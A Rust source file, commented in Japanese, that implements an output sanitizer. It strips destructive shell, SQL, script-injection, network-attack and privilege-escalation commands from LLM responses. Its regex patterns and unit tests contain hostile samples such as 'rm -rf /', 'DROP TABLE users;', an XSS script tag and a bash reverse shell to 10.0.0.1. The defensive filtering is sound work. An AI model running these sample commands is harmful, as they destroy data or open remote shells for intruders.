use regex::Regex;
use once_cell::sync::Lazy;

// シェル破壊コマンド
static DESTRUCTIVE_SHELL: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r"(?i)(?:rm\s+-[rf]+\s+/|mkfs\b|dd\s+if=|>\s*/dev/sd|fork\s*bomb|:\(\)\s*\{|chmod\s+-R\s+777\s+/|shutdown\s|reboot\s|init\s+0|kill\s+-9\s+-1)").unwrap()
});

// SQL破壊コマンド
static DESTRUCTIVE_SQL: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r"(?i)\b(?:DROP\s+(?:TABLE|DATABASE|SCHEMA|INDEX)\b|TRUNCATE\s+TABLE\b|DELETE\s+FROM\s+\S+\s*(?:;|$)|ALTER\s+TABLE\s+\S+\s+DROP\b|UPDATE\s+\S+\s+SET\s+.*WHERE\s+1\s*=\s*1)").unwrap()
});

// スクリプトインジェクション
static SCRIPT_INJECTION: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r"(?i)<script[\s>]|javascript\s*:|on(?:load|error|click)\s*=|eval\s*\(|document\.(?:cookie|write)|window\.(?:location|open)").unwrap()
});

// ネットワーク攻撃系
static NETWORK_ATTACK: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r"(?i)(?:nc\s+-[elp]+|ncat\s+-[elp]+|bash\s+-i\s+>&|/dev/tcp/|reverse.?shell|bind.?shell|msfvenom|metasploit)").unwrap()
});

// 権限昇格系
static PRIVILEGE_ESCALATION: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r"(?i)(?:sudo\s+su\b|passwd\s+root|chmod\s+[u+]*s\b|setuid|/etc/shadow|/etc/passwd\s*>>)").unwrap()
});

const REDACTED_NOTICE: &str = "[⚠ 安全上の理由により、危険なコマンドを除去しました]";

pub struct OutputSanitizer;

impl OutputSanitizer {
    /// LLM応答から危険なコマンドを除去して返す
    pub fn sanitize(text: &str) -> (String, Vec<String>) {
        let mut sanitized = text.to_string();
        let mut removed = Vec::new();

        let patterns: &[(&Lazy<Regex>, &str)] = &[
            (&DESTRUCTIVE_SHELL, "破壊的シェルコマンド"),
            (&DESTRUCTIVE_SQL, "破壊的SQLコマンド"),
            (&SCRIPT_INJECTION, "スクリプトインジェクション"),
            (&NETWORK_ATTACK, "ネットワーク攻撃コマンド"),
            (&PRIVILEGE_ESCALATION, "権限昇格コマンド"),
        ];

        for (pattern, category) in patterns {
            for cap in pattern.find_iter(&sanitized.clone()) {
                removed.push(format!("{}: {}", category, cap.as_str()));
            }
            sanitized = pattern.replace_all(&sanitized, REDACTED_NOTICE).to_string();
        }

        (sanitized, removed)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_rm_rf_removal() {
        let text = "ファイルを削除するには rm -rf / を実行します。";
        let (sanitized, removed) = OutputSanitizer::sanitize(text);
        assert!(!sanitized.contains("rm -rf /"));
        assert!(sanitized.contains(REDACTED_NOTICE));
        assert_eq!(removed.len(), 1);
    }

    #[test]
    fn test_drop_table_removal() {
        let text = "テーブルを消すには DROP TABLE users; です。";
        let (sanitized, removed) = OutputSanitizer::sanitize(text);
        assert!(!sanitized.contains("DROP TABLE"));
        assert!(!removed.is_empty());
    }

    #[test]
    fn test_script_injection_removal() {
        let text = "こちらを試してください: <script>alert('xss')</script>";
        let (sanitized, removed) = OutputSanitizer::sanitize(text);
        assert!(!sanitized.contains("<script>"));
        assert!(!removed.is_empty());
    }

    #[test]
    fn test_reverse_shell_removal() {
        let text = "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1";
        let (sanitized, removed) = OutputSanitizer::sanitize(text);
        assert!(!sanitized.contains("/dev/tcp/"));
        assert!(!removed.is_empty());
    }

    #[test]
    fn test_safe_text_unchanged() {
        let text = "SELECT * FROM users WHERE id = 1; これは安全なクエリです。";
        let (sanitized, removed) = OutputSanitizer::sanitize(text);
        assert_eq!(sanitized, text);
        assert!(removed.is_empty());
    }

    #[test]
    fn test_safe_rm_unchanged() {
        let text = "rm -f tempfile.txt でファイルを消せます。";
        let (sanitized, removed) = OutputSanitizer::sanitize(text);
        assert_eq!(sanitized, text);
        assert!(removed.is_empty());
    }
}
